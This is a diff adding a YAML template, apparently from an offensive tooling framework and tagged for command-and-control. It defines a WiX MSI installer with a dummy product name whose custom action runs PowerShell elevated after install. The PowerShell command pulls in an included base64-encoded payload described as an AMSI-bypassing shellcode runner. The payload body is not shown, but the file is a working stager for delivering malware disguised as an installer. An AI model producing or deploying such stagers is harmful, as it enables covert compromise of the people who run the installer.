@@ -1,0 +1,38 @@
+---
+metadata:
+  filename: "msi-powershell-stager.yaml"
+  tags: ["windows", "c2"]
+  created: "2026-06-02"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |
+  <?xml version="1.0" encoding="UTF-8"?>
+  <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+    <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111"
+             Name="23e23deeqwddeweqwde" Version="0.0.1" Manufacturer="Test1" Language="1033">
+      <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package" />
+      <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />
+
+      <Directory Id="TARGETDIR" Name="SourceDir">
+        <Directory Id="ProgramFilesFolder">
+          <Directory Id="INSTALLLOCATION" Name="Example">
+            <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
+            </Component>
+          </Directory>
+        </Directory>
+      </Directory>
+
+      <Feature Id="DefaultFeature" Level="1">
+        <ComponentRef Id="ApplicationFiles" />
+      </Feature>
+
+      <Property Id="ShellExe" Value="powershell.exe" />
+      <CustomAction Id="Shell" Property="ShellExe"
+                    ExeCommand="{{ include('payloads/transfer-amsi-bypass-shellcode-runner-windows-powershell-base64encoded.yaml') }}"
+                    Execute="deferred" Impersonate="no" Return="check" />
+
+      <InstallExecuteSequence>
+        <Custom Action="Shell" After="InstallFiles" />
+      </InstallExecuteSequence>
+    </Product>
+  </Wix>
